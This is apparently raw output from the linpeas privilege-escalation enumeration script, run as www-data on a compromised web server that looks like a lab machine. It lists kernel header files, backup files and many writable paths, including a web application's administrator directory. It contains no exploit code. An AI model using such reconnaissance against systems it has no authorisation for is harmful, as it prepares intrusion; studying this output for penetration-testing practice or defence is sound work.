   286592      4 -rw-r--r--   1 root       root           1309 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.stack.o.cmd
   286585      8 -rw-r--r--   1 root       root           6208 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.sha256.o.cmd
   286587      4 -rw-r--r--   1 root       root           1379 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
   286586      4 -rw-r--r--   1 root       root           3607 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.string.o.cmd
   286590      4 -rw-r--r--   1 root       root            155 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd
   286578      4 -rw-r--r--   1 root       root           1329 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.entry64.o.cmd
   286617      4 -rw-r--r--   1 root       root            292 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd
   286613      4 -rw-r--r--   1 root       root            292 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd
   286620      4 -rw-r--r--   1 root       root            402 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd
   286610      4 -rw-r--r--   1 root       root            320 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd
   286619      4 -rw-r--r--   1 root       root            316 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd
   286602      4 -rw-r--r--   1 root       root            320 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd
   286605      4 -rw-r--r--   1 root       root            340 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd
   286603      4 -rw-r--r--   1 root       root            315 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd
   286601      4 -rw-r--r--   1 root       root           3362 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/tools/.relocs_32.o.cmd
   286595      4 -rw-r--r--   1 root       root           3342 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/tools/.relocs_common.o.cmd
   286599      4 -rw-r--r--   1 root       root            146 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/tools/.relocs.cmd
   286596      4 -rw-r--r--   1 root       root           3362 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/tools/.relocs_64.o.cmd
   286624      4 -rw-r--r--   1 root       root             21 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/.6930.d
   286572      4 -rw-r--r--   1 root       root            820 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/.missing-syscalls.d
   275740    188 -rw-r--r--   1 root       root         190591 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/.config.old
   403784     16 -rw-r--r--   1 root       root          12449 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/kernel/.bounds.s.cmd
grep: write error: Broken pipe

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxrwx 1 www-data www-data 134168 Jun 30 02:56 /tmp/linpeas.sh                                                  
-rw-r--r-- 1 root root 525 Sep 17  2019 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 14050 Sep 17  2019 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 51200 Sep 17  2019 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 1440 Sep 17  2019 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 11 Sep 17  2019 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 1597 Sep 17  2019 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 1469 Sep 17  2019 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 332 Sep 17  2019 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 623640 Sep 17  2019 /var/backups/dpkg.status.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                      
/dev/mqueue                                                                                                         
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/run/screen/S-www-data
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.ns_level
/sys/kernel/security/apparmor/.ns_name
/sys/kernel/security/apparmor/.ns_stacked
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.stacked
/sys/kernel/security/apparmor/policy/.load
/sys/kernel/security/apparmor/policy/.remove
/sys/kernel/security/apparmor/policy/.replace
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/linpeas.sh
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by\x2duuid-354616bf\x2d923c\x2d43d3\x2da040\x2dae36babbbab3.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-xvda5.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dovecot.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/nmbd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/postfix.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/samba-ad-dc.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/smbd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/winbind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/spool/samba
/var/tmp
/var/www/html
/var/www/html/45kra24zxs28v3yd
/var/www/html/45kra24zxs28v3yd/administrator
/var/www/html/45kra24zxs28v3yd/administrator/Configuration.php
/var/www/html/45kra24zxs28v3yd/administrator/alerts
/var/www/html/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php
/var/www/html/45kra24zxs28v3yd/administrator/alerts/alertIFrame.php
/var/www/html/45kra24zxs28v3yd/administrator/alerts/alertImage.php
/var/www/html/45kra24zxs28v3yd/administrator/alerts/defaultAlert.php
/var/www/html/45kra24zxs28v3yd/administrator/classes
/var/www/html/45kra24zxs28v3yd/administrator/classes/Content.php
/var/www/html/45kra24zxs28v3yd/administrator/classes/DataBase.php
/var/www/html/45kra24zxs28v3yd/administrator/classes/Menu.php
/var/www/html/45kra24zxs28v3yd/administrator/classes/Paginator.php
/var/www/html/45kra24zxs28v3yd/administrator/classes/Security.php
/var/www/html/45kra24zxs28v3yd/administrator/classes/User.php
/var/www/html/45kra24zxs28v3yd/administrator/components
/var/www/html/45kra24zxs28v3yd/administrator/components/com_general_config
/var/www/html/45kra24zxs28v3yd/administrator/components/com_general_config/index.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/controllers
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/controllers/Menu.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/index.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/Menu.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/tmpl
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/tmpl/add_permissions.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/tmpl/edit_menu.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_menu/views/tmpl/list_menu.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/controllers
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/controllers/Admin_Table.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/controllers/Table_Manager.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Check.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Date.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/File.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Id.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Radio.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Select.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/Text.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/TextArea.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Date.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/File.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Radio.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Select.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/Text.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/fields/config/TextArea.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/index.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/Admin_Table.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/Table_Manager.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl/edit_admin_table.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl/edit_table_manager.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl/list_admin_table.php
/var/www/html/45kra24zxs28v3yd/administrator/components/com_table_manager/views/tmpl/list_table_manager.php
/var/www/html/45kra24zxs28v3yd/administrator/index.php
/var/www/html/45kra24zxs28v3yd/administrator/js
/var/www/html/45kra24zxs28v3yd/administrator/js/Copy of tu_main.js
/var/www/html/45kra24zxs28v3yd/administrator/js/jquery-ui.js
/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.js
/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.md5.js
/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.sha1.js
/var/www/html/45kra24zxs28v3yd/administrator/js/jquery.validate.js
/var/www/html/45kra24zxs28v3yd/administrator/js/swfobject.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/langs/en.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/css/advhr.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/js/rule.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advhr/rule.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/css/advimage.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/image.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/js/image.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advimage/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/css/advlink.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/js/advlink.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlink/link.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlist
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlist/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/advlist/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autolink
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autolink/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autolink/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autoresize
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autoresize/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autoresize/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/autosave/langs/en.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/bbcode
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/bbcode/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/bbcode/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/contextmenu
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/contextmenu/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/contextmenu/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/directionality
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/directionality/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/directionality/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/emotions.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/js/emotions.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/emotions/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/dialog.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/js/dialog.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/langs/en.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example_dependency
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example_dependency/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/example_dependency/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/css/fullpage.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/fullpage.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/js/fullpage.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullpage/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullscreen
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullscreen/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullscreen/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/fullscreen/fullscreen.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/iespell
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/iespell/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/iespell/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/skins
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/skins/clearlooks2
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/skins/clearlooks2/img
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/skins/clearlooks2/window.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/inlinepopups/template.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/insertdatetime
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/insertdatetime/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/insertdatetime/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/layer
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/layer/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/layer/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/legacyoutput
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/legacyoutput/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/legacyoutput/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/lists
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/lists/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/lists/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/css/media.css
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/js/embed.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/js/media.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/langs
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/langs/en_dlg.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/media.htm
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/media/moxieplayer.swf
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/nonbreaking
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/nonbreaking/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/nonbreaking/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/noneditable
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/noneditable/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/noneditable/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/pagebreak
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/pagebreak/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/pagebreak/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/editor_plugin.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/editor_plugin_src.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/js/pastetext.js
/var/www/html/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/paste/js/pasteword.js
